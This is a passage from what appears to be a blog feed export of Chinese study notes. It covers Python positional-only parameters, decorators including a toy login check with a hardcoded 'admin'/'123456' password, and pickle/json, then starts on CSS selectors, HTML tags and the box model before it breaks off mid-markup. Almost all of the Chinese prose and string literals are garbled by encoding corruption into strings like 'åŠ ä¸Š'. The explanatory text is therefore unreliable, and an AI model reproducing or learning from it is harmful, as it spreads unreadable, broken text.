<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: foo() got multiple values <span class="keyword">for</span> argument <span class="string">&#x27;name&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>åŠ ä¸Š <code>/</code> ï¼ˆä»…é™ä½ç½®å‚æ•°ï¼‰åï¼Œå°±å¯ä»¥äº†ã€‚æ­¤æ—¶ï¼Œå‡½æ•°å®šä¹‰æŠŠ <code>name</code> å½“ä½œä½ç½®å‚æ•°ï¼Œ<code>&#39;name&#39;</code> ä¹Ÿå¯ä»¥ä½œä¸ºå…³é”®å­—å‚æ•°çš„é”®ï¼š</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, /, **kwds</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>æ¢å¥è¯è¯´ï¼Œä»…é™ä½ç½®å½¢å‚çš„åç§°å¯ä»¥åœ¨ <code>**kwds</code> ä¸­ä½¿ç”¨ï¼Œè€Œä¸äº§ç”Ÿæ­§ä¹‰ã€‚</p>
<p><strong>å–è‡ªpythonå®˜æ–¹æ–‡æ¡£</strong></p>
<h1 id="äºŒã€è£…é¥°å™¨"><a href="#äºŒã€è£…é¥°å™¨" class="headerlink" title="äºŒã€è£…é¥°å™¨"></a>äºŒã€è£…é¥°å™¨</h1><p>å¯ä»¥é€šè¿‡ä¿®é¥°å»ç®€åŒ–ä»£ç å¹¶ä¸”è¾¾åˆ°ç›¸åº”çš„ç›®çš„ã€‚</p>
<h2 id="1ã€è£…é¥°å™¨é›å½¢"><a href="#1ã€è£…é¥°å™¨é›å½¢" class="headerlink" title="1ã€è£…é¥°å™¨é›å½¢"></a>1ã€è£…é¥°å™¨é›å½¢</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guanjia</span>(<span class="params">game</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ‰“å¼€å¤–æŒ‚&quot;</span>)</span><br><span class="line">        game()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å…³é—­å¤–æŒ‚&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_dnf</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ä½ å¥½å•Šï¼æˆ‘å«èµ›åˆ©äºšï¼Œä»Šå¤©åˆæ˜¯ç¾å¥½çš„ä¸€å¤©ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@guanjia</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_lol</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ¬¢è¿æ¥åˆ°è‹±é›„è”ç›Ÿ&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_lol()</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„è£…é¥°å™¨ï¼Œé€šè¿‡è¿™ç§æ–¹æ³•å°±èƒ½ä½¿æˆ‘ä»¬æ›´æ–¹ä¾¿çš„å¯¹å‡½æ•°è¿›è¡Œç›¸å…³çš„åŠ è£…ä»¥åŠä¼˜åŒ–ï¼Œ</p>
<h2 id="2ã€è£…é¥°å™¨çš„ç®€å•åº”ç”¨"><a href="#2ã€è£…é¥°å™¨çš„ç®€å•åº”ç”¨" class="headerlink" title="2ã€è£…é¥°å™¨çš„ç®€å•åº”ç”¨"></a>2ã€è£…é¥°å™¨çš„ç®€å•åº”ç”¨</h2><p>åœ¨ä¸€äº›ç¨‹åºåº”ç”¨å½“ä¸­ï¼Œæˆ‘ä»¬ä¼šéœ€è¦åˆ©ç”¨åˆ°ç™»å…¥çš„æ“ä½œï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±ä¼šæƒ³è¦å®ç°ï¼Œå»å®ç°ä»€ä¹ˆåŠŸèƒ½ä¹‹å‰éœ€è¦å…ˆç™»å…¥ï¼Œè¿™ä¸ªæ—¶å€™è£…é¥°å™¨å°±æœ‰ç”¨æ­¦ä¹‹åœ°äº†ã€‚ä¸å¤šè¯´ï¼Œç›´æ¥çœ‹ä¸ªå°æ¡ˆä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">login_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_verify</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">global</span> login_flag</span><br><span class="line">        <span class="keyword">if</span> login_flag:</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;è¯·å…ˆç™»å½•&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;è¿˜æœªå®Œæˆç”¨æˆ·ç™»å½•æ“ä½œ&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                username = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥ç”¨æˆ·åï¼š&#x27;</span>)</span><br><span class="line">                password = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥å¯†ç ï¼š&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>)</span><br><span class="line">                    login_flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥&#x27;</span>)</span><br><span class="line">            ret = fn(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;æ¬¢è¿æ¥åˆ°é¦–é¡µ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;æ¬¢è¿æ¥åˆ°æˆ‘çš„è®¢å•&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;æ¬¢è¿æ¥åˆ°æˆ‘çš„èµ„æ–™&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index()</span><br><span class="line">order()</span><br><span class="line">profile()</span><br></pre></td></tr></table></figure>

<p>ä¹‹åçš„ç›¸åº”æ˜¯</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS C:\VScodeproject&gt; &amp; C:/Users/ASUS/AppData/Local/Programs/Python/Python310/python.exe c:/VScodeproject/python/python-study/è£…é¥°å™¨åº”ç”¨.py</span><br><span class="line">è¯·å…ˆç™»å½•</span><br><span class="line">è¿˜æœªå®Œæˆç”¨æˆ·ç™»å½•æ“ä½œ</span><br><span class="line">è¯·è¾“å…¥ç”¨æˆ·åï¼šadmin</span><br><span class="line">è¯·è¾“å…¥å¯†ç ï¼š<span class="number">123456</span></span><br><span class="line">ç™»å½•æˆåŠŸ</span><br><span class="line">æ¬¢è¿æ¥åˆ°é¦–é¡µ</span><br><span class="line">æ¬¢è¿æ¥åˆ°æˆ‘çš„è®¢å•</span><br><span class="line">æ¬¢è¿æ¥åˆ°æˆ‘çš„èµ„æ–™</span><br></pre></td></tr></table></figure>

<h1 id="ä¸‰ã€Pickleå’ŒJsonæ¨¡å—çš„æ€»ç»“"><a href="#ä¸‰ã€Pickleå’ŒJsonæ¨¡å—çš„æ€»ç»“" class="headerlink" title="ä¸‰ã€Pickleå’ŒJsonæ¨¡å—çš„æ€»ç»“"></a>ä¸‰ã€Pickleå’ŒJsonæ¨¡å—çš„æ€»ç»“</h1><p>Pickleæ˜¯å°†å¯¹è±¡ï¼ˆæ•°æ®ï¼‰è½¬åŒ–ä¸ºå­—èŠ‚ï¼Œjsonæ˜¯å°†å¯¹è±¡ï¼ˆæ•°æ®ï¼‰è½¬åŒ–ä¸ºjsonæ ¼å¼</p>
<blockquote>
<p>1ã€dumps    æŠŠå¯¹è±¡ï¼ˆæ•°æ®ï¼‰è½¬åŒ–ä¸ºå­—èŠ‚</p>
<p>2ã€loads       æŠŠå­—èŠ‚è½¬åŒ–å›å¯¹è±¡ï¼ˆæ•°æ®ï¼‰</p>
<p>3ã€dump      æŠŠå¯¹è±¡åºåˆ—åŒ–æˆå­—èŠ‚ä¹‹åå†™å…¥åˆ°æ–‡ä»¶</p>
<p>3ã€load         æŠŠæ–‡ä»¶ä¸­çš„å­—èŠ‚ååºåˆ—åŒ–æˆå¯¹è±¡ </p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>javaå­¦ä¹ å†ç¨‹è®°å½•-å‰ç«¯åŸºç¡€</title>
    <url>/2023/11/21/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>å…¶å®javaæ˜¯ä¹‹å‰ä¸€æ®µæ—¶é—´å­¦ä¹ çš„ï¼Œä½†æ˜¯å­¦åˆ°ä¸€åŠçš„æ—¶å€™å‘ç°æˆ‘çš„pythonèƒ½åŠ›ä¸è¡Œï¼Œæ‰€ä»¥åˆè½¬å»å­¦pythonäº†ï¼Œç„¶ååˆç”±äºæˆ‘ä¹‹å‰æ²¡æœ‰è®°ç¬”è®°çš„ä¹ æƒ¯ï¼Œå°±å¯¼è‡´æˆ‘ç°åœ¨å†å›æ¥çœ‹javaï¼Œå°±åŸºæœ¬ä¸Šå¿˜å…‰äº†ï¼Œæ‰€ä»¥æƒ³ç€å€Ÿç€å†™åšå®¢çš„åŠŸå¤«å»å°†æˆ‘çš„ä¸€äº›javaå­¦ä¹ å†ç¨‹è®°å½•ä¸‹æ¥ï¼Œä¹Ÿèƒ½å»å¥½å¥½çš„å¤ä¹ ä¸€ä¸‹ä¹‹å‰çš„çŸ¥è¯†ã€‚æ‰€ä»¥è¿™ç¯‡æ–‡ç« å¹¶ä¸ä¸»è¦æ˜¯ä¸ºäº†å…¥é—¨ï¼Œæ›´å¤šçš„åªæ˜¯æˆ‘è‡ªå·±çš„ä¸€ä¸ªå­¦ä¹ è®°å½•ï¼Œä»…é™å‚è€ƒã€‚</p>
<span id="more"></span>

<h1 id="ä¸€ã€ä¸€äº›åŸºç¡€çš„å‰ç«¯çŸ¥è¯†"><a href="#ä¸€ã€ä¸€äº›åŸºç¡€çš„å‰ç«¯çŸ¥è¯†" class="headerlink" title="ä¸€ã€ä¸€äº›åŸºç¡€çš„å‰ç«¯çŸ¥è¯†"></a>ä¸€ã€ä¸€äº›åŸºç¡€çš„å‰ç«¯çŸ¥è¯†</h1><h2 id="1ã€cssä¸­çš„å…ƒç´ é€‰æ‹©å™¨"><a href="#1ã€cssä¸­çš„å…ƒç´ é€‰æ‹©å™¨" class="headerlink" title="1ã€cssä¸­çš„å…ƒç´ é€‰æ‹©å™¨:"></a>1ã€cssä¸­çš„å…ƒç´ é€‰æ‹©å™¨:</h2><p>é¡¾åæ€ä¹‰ï¼šé€‰æ‹©å™¨æ˜¯é€‰å–éœ€è®¾ç½®æ ·å¼çš„å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬æ ¹æ®ä¸šåŠ¡åœºæ™¯ä¸åŒï¼Œé€‰æ‹©çš„æ ‡ç­¾çš„éœ€æ±‚ä¹Ÿæ˜¯å¤šç§å¤šæ ·çš„ï¼Œæ‰€ä»¥é€‰æ‹©å™¨æœ‰å¾ˆå¤šç§ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯åšåå°å¼€å‘çš„ï¼Œæ‰€ä»¥å¯¹äºcssé€‰æ‹©å™¨ï¼Œæˆ‘ä»¬åªå­¦ä¹ æœ€åŸºæœ¬çš„3ç§ã€‚</p>
<p><strong>é€‰æ‹©å™¨é€šç”¨è¯­æ³•å¦‚ä¸‹</strong>ï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">é€‰æ‹©å™¨å   &#123;</span><br><span class="line">    cssæ ·å¼åï¼šcssæ ·å¼å€¼;</span><br><span class="line">    cssæ ·å¼åï¼šcssæ ·å¼å€¼;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦å­¦ä¹ çš„3ç§é€‰æ‹©å™¨æ˜¯å…ƒç´ é€‰æ‹©å™¨ï¼Œidé€‰æ‹©å™¨ï¼Œclassé€‰æ‹©å™¨ï¼Œè¯­æ³•ä»¥åŠä½œç”¨å¦‚ä¸‹ï¼š</p>
<h3 id="1-å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰é€‰æ‹©å™¨ï¼š"><a href="#1-å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰é€‰æ‹©å™¨ï¼š" class="headerlink" title="1.å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰é€‰æ‹©å™¨ï¼š"></a><strong>1.å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰é€‰æ‹©å™¨ï¼š</strong></h3><ul>
<li>é€‰æ‹©å™¨çš„åå­—å¿…é¡»æ˜¯æ ‡ç­¾çš„åå­—</li>
<li>ä½œç”¨ï¼šé€‰æ‹©å™¨ä¸­çš„æ ·å¼ä¼šä½œç”¨äºæ‰€æœ‰åŒåçš„æ ‡ç­¾ä¸Š</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ƒç´ åç§° &#123;</span><br><span class="line">    cssæ ·å¼å:cssæ ·å¼å€¼ï¼›</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-idé€‰æ‹©å™¨"><a href="#2-idé€‰æ‹©å™¨" class="headerlink" title="2.idé€‰æ‹©å™¨:"></a><strong>2.idé€‰æ‹©å™¨:</strong></h3><ul>
<li>é€‰æ‹©å™¨çš„åå­—å‰é¢éœ€è¦åŠ ä¸Š#</li>
<li>ä½œç”¨ï¼šé€‰æ‹©å™¨ä¸­çš„æ ·å¼ä¼šä½œç”¨äºæŒ‡å®šidçš„æ ‡ç­¾ä¸Šï¼Œè€Œä¸”æœ‰ä¸”åªæœ‰ä¸€ä¸ªæ ‡ç­¾ï¼ˆç”±äºidæ˜¯å”¯ä¸€çš„ï¼‰</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#idå±æ€§å€¼ &#123;</span><br><span class="line">    cssæ ·å¼å:cssæ ·å¼å€¼ï¼›</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#did</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-ç±»é€‰æ‹©å™¨ï¼š"><a href="#3-ç±»é€‰æ‹©å™¨ï¼š" class="headerlink" title="3.ç±»é€‰æ‹©å™¨ï¼š"></a><strong>3.ç±»é€‰æ‹©å™¨ï¼š</strong></h3><ul>
<li>é€‰æ‹©å™¨çš„åå­—å‰é¢éœ€è¦åŠ ä¸Š .</li>
<li>ä½œç”¨ï¼šé€‰æ‹©å™¨ä¸­çš„æ ·å¼ä¼šä½œç”¨äºæ‰€æœ‰classçš„å±æ€§å€¼å’Œè¯¥åå­—ä¸€æ ·çš„æ ‡ç­¾ä¸Šï¼Œå¯ä»¥æ˜¯å¤šä¸ª</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.classå±æ€§å€¼ &#123;</span><br><span class="line">    cssæ ·å¼å:cssæ ·å¼å€¼ï¼›</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.cls</span>&#123;</span><br><span class="line">     <span class="attribute">color</span>: green;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="2ã€ä¸€äº›å¸¸è§çš„htmlæ ‡ç­¾"><a href="#2ã€ä¸€äº›å¸¸è§çš„htmlæ ‡ç­¾" class="headerlink" title="2ã€ä¸€äº›å¸¸è§çš„htmlæ ‡ç­¾"></a>2ã€ä¸€äº›å¸¸è§çš„htmlæ ‡ç­¾</h2><h3 id="1-è§†é¢‘ã€éŸ³é¢‘æ ‡ç­¾"><a href="#1-è§†é¢‘ã€éŸ³é¢‘æ ‡ç­¾" class="headerlink" title="1). è§†é¢‘ã€éŸ³é¢‘æ ‡ç­¾"></a><strong>1). è§†é¢‘ã€éŸ³é¢‘æ ‡ç­¾</strong></h3><ul>
<li><p>è§†é¢‘æ ‡ç­¾: &lt;video&gt;</p>
<ul>
<li>å±æ€§: <ul>
<li>src: è§„å®šè§†é¢‘çš„url</li>
<li>controls: æ˜¾ç¤ºæ’­æ”¾æ§ä»¶</li>
<li>width: æ’­æ”¾å™¨çš„å®½åº¦</li>
<li>height: æ’­æ”¾å™¨çš„é«˜åº¦</li>
</ul>
</li>
</ul>
</li>
<li><p>éŸ³é¢‘æ ‡ç­¾: &lt;audio&gt;</p>
<ul>
<li>å±æ€§:<ul>
<li>src: è§„å®šéŸ³é¢‘çš„url</li>
<li>controls: æ˜¾ç¤ºæ’­æ”¾æ§ä»¶</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-æ®µè½æ ‡ç­¾"><a href="#2-æ®µè½æ ‡ç­¾" class="headerlink" title="2). æ®µè½æ ‡ç­¾"></a><strong>2). æ®µè½æ ‡ç­¾</strong></h3><ul>
<li><p>æ¢è¡Œæ ‡ç­¾: &lt;br&gt;</p>
<ul>
<li>æ³¨æ„: åœ¨HTMLé¡µé¢ä¸­,æˆ‘ä»¬åœ¨ç¼–è¾‘å™¨ä¸­é€šè¿‡å›è½¦å®ç°çš„æ¢è¡Œ, ä»…ä»…åœ¨æ–‡æœ¬ç¼–è¾‘å™¨ä¸­ä¼šçœ‹åˆ°æ¢è¡Œæ•ˆæœ, æµè§ˆå™¨æ˜¯ä¸ä¼šè§£æçš„, HTMLä¸­æ¢è¡Œéœ€è¦é€šè¿‡bræ ‡ç­¾</li>
</ul>
</li>
<li><p>æ®µè½æ ‡ç­¾: &lt;p&gt;</p>
<ul>
<li>å¦‚: &lt;p&gt; è¿™æ˜¯ä¸€ä¸ªæ®µè½ &lt;&#x2F;p&gt;</li>
</ul>
</li>
</ul>
<h3 id="3-æ–‡æœ¬æ ¼å¼æ ‡ç­¾"><a href="#3-æ–‡æœ¬æ ¼å¼æ ‡ç­¾" class="headerlink" title="3). æ–‡æœ¬æ ¼å¼æ ‡ç­¾"></a><strong>3). æ–‡æœ¬æ ¼å¼æ ‡ç­¾</strong></h3><table>
<thead>
<tr>
<th>æ•ˆæœ</th>
<th>æ ‡ç­¾</th>
<th>æ ‡ç­¾(å¼ºè°ƒ)</th>
</tr>
</thead>
<tbody><tr>
<td>åŠ ç²—</td>
<td>b</td>
<td>strong</td>
</tr>
<tr>
<td>å€¾æ–œ</td>
<td>i</td>
<td>em</td>
</tr>
<tr>
<td>ä¸‹åˆ’çº¿</td>
<td>u</td>
<td>ins</td>
</tr>
<tr>
<td>åˆ é™¤çº¿</td>
<td>s</td>
<td>del</td>
</tr>
</tbody></table>
<p>å‰é¢çš„æ ‡ç­¾ bã€iã€uã€s å°±ä»…ä»…æ˜¯å®ç°åŠ ç²—ã€å€¾æ–œã€ä¸‹åˆ’çº¿ã€åˆ é™¤çº¿çš„æ•ˆæœï¼Œæ˜¯æ²¡æœ‰å¼ºè°ƒè¯­ä¹‰çš„ã€‚ è€Œåé¢çš„strongã€emã€insã€delåœ¨å®ç°åŠ ç²—ã€å€¾æ–œã€ä¸‹åˆ’çº¿ã€åˆ é™¤çº¿çš„æ•ˆæœçš„åŒæ—¶ï¼Œè¿˜å¸¦æœ‰å¼ºè°ƒè¯­ä¹‰ã€‚</p>
<blockquote>
<p>æ³¨æ„äº‹é¡¹: </p>
<ul>
<li><p>åœ¨HTMLé¡µé¢ä¸­æ— è®ºè¾“å…¥äº†å¤šå°‘ä¸ªç©ºæ ¼, æœ€å¤šåªä¼šæ˜¾ç¤ºä¸€ä¸ªã€‚ å¯ä»¥ä½¿ç”¨ç©ºæ ¼å ä½ç¬¦ï¼ˆ&amp;nbspï¼›ï¼‰æ¥ç”Ÿæˆç©ºæ ¼ï¼Œå¦‚æœéœ€è¦å¤šä¸ªç©ºæ ¼ï¼Œå°±ä½¿ç”¨å¤šæ¬¡å ä½ç¬¦ã€‚</p>
</li>
<li><p>é‚£åœ¨HTMLä¸­ï¼Œé™¤äº†ç©ºæ ¼å ä½ç¬¦ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„å ä½ç¬¦(äº†è§£, åªéœ€è¦çŸ¥é“ç©ºæ ¼çš„å ä½ç¬¦å†™æ³•å³å¯)ï¼Œå¦‚ä¸‹ï¼š</p>
<ul>
<li><table>
<thead>
<tr>
<th align="left">æ˜¾ç¤ºç»“æœ</th>
<th align="left">æè¿°</th>
<th align="left">å ä½ç¬¦</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">ç©ºæ ¼</td>
<td align="left">&amp;nbsp;</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">å°äºå·</td>
<td align="left">&amp;lt;</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">å¤§äºå·</td>
<td align="left">&amp;gt;</td>
</tr>
<tr>
<td align="left">&amp;</td>
<td align="left">å’Œå·</td>
<td align="left">&amp;amp;</td>
</tr>
<tr>
<td align="left">â€œ</td>
<td align="left">å¼•å·</td>
<td align="left">&amp;quot;</td>
</tr>
<tr>
<td align="left">â€˜</td>
<td align="left">æ’‡å·</td>
<td align="left">&amp;apos;</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="4-å¸ƒå±€ç¾åŒ–"><a href="#4-å¸ƒå±€ç¾åŒ–" class="headerlink" title="4).å¸ƒå±€ç¾åŒ–"></a>4).å¸ƒå±€ç¾åŒ–</h3><h4 id="â‘ ç›’å­æ¨¡å‹"><a href="#â‘ ç›’å­æ¨¡å‹" class="headerlink" title="â‘ ç›’å­æ¨¡å‹"></a>â‘ ç›’å­æ¨¡å‹</h4><ul>
<li><p>ç›’å­ï¼šé¡µé¢ä¸­æ‰€æœ‰çš„å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰ï¼Œéƒ½å¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ª ç›’å­ï¼Œç”±ç›’å­å°†é¡µé¢ä¸­çš„å…ƒç´ åŒ…å«åœ¨ä¸€ä¸ªçŸ©å½¢åŒºåŸŸå†…ï¼Œé€šè¿‡ç›’å­çš„è§†è§’æ›´æ–¹ä¾¿çš„è¿›è¡Œé¡µé¢å¸ƒå±€</p>
</li>
<li><p>ç›’å­æ¨¡å‹ç»„æˆï¼šå†…å®¹åŒºåŸŸï¼ˆcontentï¼‰ã€å†…è¾¹è·åŒºåŸŸï¼ˆpaddingï¼‰ã€è¾¹æ¡†åŒºåŸŸï¼ˆborderï¼‰ã€å¤–è¾¹è·åŒºåŸŸï¼ˆmarginï¼‰</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f529eda86837643eb1ca32955d5c36f6--cead--image-20230310092820616.png" alt="image-20230310092820616"></p>
<p>CSSç›’å­æ¨¡å‹ï¼Œå…¶å®å’Œæ—¥å¸¸ç”Ÿæ´»ä¸­çš„åŒ…è£…ç›’æ˜¯éå¸¸ç±»ä¼¼çš„ï¼Œå°±æ¯”å¦‚ï¼š</p>
<p> <img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/0f2a5351ad32ffa9c1fe2588bec73ffd--df3d--image-20230310093247265.png" alt="image-20230310093247265"></p>
<p>ç›’å­çš„å¤§å°ï¼Œå…¶å®å°±åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼š borderã€paddingã€contentï¼Œè€Œmarginå¤–è¾¹è·æ˜¯ä¸åŒ…æ‹¬åœ¨ç›’å­ä¹‹å†…çš„ã€‚</p>
<p>ç›’å­æ¨¡å‹ä»£ç ç¤ºä¾‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ç›’å­æ¨¡å‹<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;  <span class="comment">/* å®½åº¦ */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;  <span class="comment">/* é«˜åº¦ */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box; <span class="comment">/* æŒ‡å®šwidth heightä¸ºç›’å­çš„é«˜å®½ */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: aquamarine; <span class="comment">/* èƒŒæ™¯è‰² */</span></span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span>; <span class="comment">/* å†…è¾¹è·, ä¸Š å³ ä¸‹ å·¦ , è¾¹è·éƒ½ä¸€è¡Œ, å¯ä»¥ç®€å†™: padding: 20px;*/</span> </span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">10px</span> solid red; <span class="comment">/* è¾¹æ¡†, å®½åº¦ çº¿æ¡ç±»å‹ é¢œè‰² */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span>; <span class="comment">/* å¤–è¾¹è·, ä¸Š å³ ä¸‹ å·¦ , è¾¹è·éƒ½ä¸€è¡Œ, å¯ä»¥ç®€å†™: margin: 30px; */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span 